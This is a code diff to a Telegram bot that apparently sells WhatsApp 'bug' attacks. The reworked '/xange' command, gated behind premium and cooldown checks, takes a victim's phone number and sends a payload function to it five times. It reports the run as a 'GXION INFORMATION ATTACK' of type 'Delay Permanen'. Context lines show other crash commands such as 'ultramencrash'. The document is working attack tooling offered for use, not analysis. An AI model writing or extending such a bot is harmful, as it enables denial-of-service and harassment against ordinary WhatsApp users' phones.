@@ -2407,29 +2407,56 @@ bot.command("lowsdelay", checkAllPremium, checkWhatsAppConnection, checkCooldown
 }); 
 /// CASE BUG 6 \\\
 bot.command("xange", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {
+  const q = ctx.message.text.split(" ")[1];
+  if (!q) return ctx.reply(`🪧 ☇ Format: /xange 62×××`);
 
-  const q = ctx.message.text.split(" ")[1]; 
-  if (!q) return ctx.reply("🪧 ☇ Example : /xange 62xx");
+  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
+  let mention = true;
 
-  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
-  await ctx.reply(
+  const processMessage = await ctx.telegram.sendPhoto(
+    ctx.chat.id,
+    { source: "./image/Gxion.jpg" }, 
+    {
+      caption: `
+<blockquote><pre>GXION INFORMATION ATTACK</pre></blockquote>
+⌑ Target : ${q}
+⌑ Type : Delay Permanen 
+⌑ Status : Process`,
+      parse_mode: "HTML",
+      reply_markup: {
+        inline_keyboard: [[
+          { text: "𝐂𝐡𝐞𝐜𝐤 ☇ 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${q}` }
+        ]]
+      }
+    }
+  );
 
-`
-<blockquote>✅ SUCCES SENDING BUGS TO : ${q}</blockquote>`,
-  {
-    parse_mode: "HTML",
-    reply_markup: {
-      inline_keyboard: [
-        [{ text: "☛ CEK TARGET ☚", url: `https://wa.me/${q}`, style: "success" }],
-      ],
-    },
-  });
+  const processMessageId = processMessage.message_id;
 
-  for (let r = 0; r < 5; r++) {
+    for (let r = 0; r < 5; r++) {
     await OneRxVz(sock, target);
     await sleep(800)
+  }
+
+  await ctx.telegram.editMessageCaption(
+    ctx.chat.id,
+    processMessageId,
+    undefined,
+    `
+<blockquote><pre>GXION INFORMATION ATTACK</pre></blockquote>
+⌑ Target : ${q}
+⌑ Type : Delay Permanen
+⌑ Status : Success`,
+    {
+      parse_mode: "HTML",
+      reply_markup: {
+        inline_keyboard: [[
+          { text: "𝐂𝐡𝐞𝐜𝐤 ☇ 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${q}`, style: "success" }
+        ]]
+      }
     }
-})
+  );
+});
 /// --------- ( CASE BUG 7 ) ---------- \\\
 bot.command("ultramencrash", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {
   const q = ctx.message.text.split(" ")[1];
